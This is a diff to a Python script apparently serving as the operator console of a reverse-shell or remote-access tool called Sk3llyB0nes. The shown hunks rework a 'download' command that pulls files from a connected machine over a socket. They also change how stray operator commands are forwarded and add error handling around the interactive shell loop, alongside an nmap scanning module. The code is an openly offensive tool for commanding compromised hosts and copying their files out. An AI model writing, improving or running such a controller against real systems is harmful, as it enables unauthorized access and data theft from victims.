@@ -7,9 +7,6 @@ import nmap
 import requests
 import tqdm
 
-### TODO: FIX SHELL NOT WORKING AFTER DOWNLOAD
-###           - MAKE DOWNLOADING BETTER (ex. download file.txt)
-
 print(" _____ _    _____ _ _      ______  _____ ")
 print("/  ___| |  |____ | | |     | ___ \|  _  | ")
 print("\ `--.| | __   / / | |_   _| |_/ /| |/' |_ __   ___  ___ ")
@@ -18,8 +15,6 @@ print("/\__/ /   <.___/ / | | |_| | |_/ /\ |_/ / | | |  __/\__ \ ")
 print("\____/|_|\_\____/|_|_|\__, \____/  \___/|_| |_|\___||___/ ")
 print("                       __/ | ")
 print("                      |___/ ")
-
-SEPARATOR = "<SEPARATOR>"
 
 ### Run in background Unix: python3 myfile &
 
@@ -84,8 +79,8 @@ def command_skeleton(conn):
 				s.close()
 				#sys.exit()
 				main()
-			if cmd == 'download':
-				"""conn.send(cmd.encode())
+			elif cmd == 'download':
+				conn.send(cmd.encode())
 				path = input("[i] File to download (include extentsion): ")
 				conn.send(path.encode())
 				file = conn.recv(10000000)
@@ -93,28 +88,8 @@ def command_skeleton(conn):
 				new_file = open(new_name, "wb")
 				new_file.write(file)
 				new_file.close()
-				print("[i] " + new_name + " has been saved")"""
-				conn.send(cmd.encode())
-				recieved = conn.recv(BYTES).decode()
-				filename, filesize = recieved.split(SEPARATOR)
-				filename = os.path.basename(filename)
-				filesize = int(filesize)
-
-				# start receiving the file from the socket
-				# and writing to the file stream
-				progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-				with open(filename, "wb") as f:
-				    for _ in progress:
-				        # read 1024 bytes from the socket (receive)
-				        bytes_read = conn.recv(BYTES)
-				        if not bytes_read:    
-				            # nothing is received
-				            # file transmitting is done
-				            break
-				        # write to the file the bytes we just received
-				        f.write(bytes_read)
-				        # update the progress bar
-				        progress.update(len(bytes_read))
+				print("[i] " + new_name + " has been saved")
+				print("Hit ctrl + c if shell gets stuck or confuses commands")
 
 			else:
 				conn.send(str.encode(cmd))
@@ -123,6 +98,9 @@ def command_skeleton(conn):
 		except KeyboardInterrupt:
 			print("") # Another empty line
 			print("\n" + Style.BRIGHT + Fore.BLUE + "[i] Type 'quit' to close shell" + Style.RESET_ALL)
+			continue
+		except UnicodeDecodeError:
+			print("A decoding error occured. Do not be alarmed")
 			continue
 
 #nmap scan module
